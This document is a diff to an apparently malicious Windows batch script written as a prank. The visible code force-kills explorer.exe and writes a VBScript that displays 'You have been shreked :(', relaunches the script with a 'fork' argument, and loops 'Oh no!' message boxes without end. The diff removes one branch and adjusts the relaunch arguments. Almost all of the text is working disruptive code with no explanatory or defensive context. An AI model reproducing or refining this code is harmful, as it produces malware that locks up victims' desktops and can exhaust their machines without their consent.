@@ -8,8 +8,6 @@ if "%1" NEQ "min" exit
 
 if "%2"=="setup" (
     goto setup
-) else if "%2"=="vbs-loop" (
-    goto vbs-loop
 ) else if "%2"=="fork" (
     goto fork
 )
@@ -23,7 +21,7 @@ taskkill /F /im explorer.exe
 (
 echo Set objShell = WScript.CreateObject("WScript.Shell")
 echo MsgBox "You have been shreked :("
-echo objShell.run WScript.Arguments(0) & " fork"
+echo objShell.run WScript.Arguments(0) & " min fork"
 echo Do
 echo MsgBox "Oh no!"
 echo Loop
